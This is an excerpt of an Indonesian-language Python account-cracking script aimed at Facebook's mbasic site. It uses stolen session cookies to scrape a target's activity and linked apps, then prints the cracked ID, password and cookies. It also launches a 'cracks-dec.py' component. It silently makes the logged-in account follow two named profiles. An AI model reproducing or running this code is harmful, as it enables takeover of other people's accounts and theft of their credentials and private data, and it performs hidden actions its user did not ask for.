...
class bot:
	...
	def usernem(self):
		self.ikuti("romi.afrizal.102")
		self.ikuti("romi.alfarabi")
		...
		try:
			...
			if "mbasic_logout_button" in cek:
				...
				if "Laporkan Masalah" in cek:
					mikey = bot(romz_xyz(self.cok),self.url)
					info(romz_xyz(self.cok),cek).myinfo()
					mikey.usernem()
...
class Menu():
	...
	def tentang(self):
		...
		try:
			...
			info(kueh, requests.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text).myinfo()
			os.system('python cracks-dec.py')
		try:
...
def gatau_gabut(use, kuki):
	...
	response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
	response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
	...
	infoakun += cek_apk(kuki, ret = True)
	print('\n')
	statusok = f'[•] ID       : {user}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
	print(statusok)
...
def cek_apk(kukis, ret = False):
	...
	try:
		for i in range(len(game)):
			teks += ("%s[Apk Aktif]-->%s%s%s%s\n"%(H,P,[i+1],H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
	...
	try:
		for i in range(len(game)):
			teks += ("%s[Non-Aktif]-->%s%s%s%s\n"%(M,P,[i+1],M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	if ret: return teks
	else: print(teks)
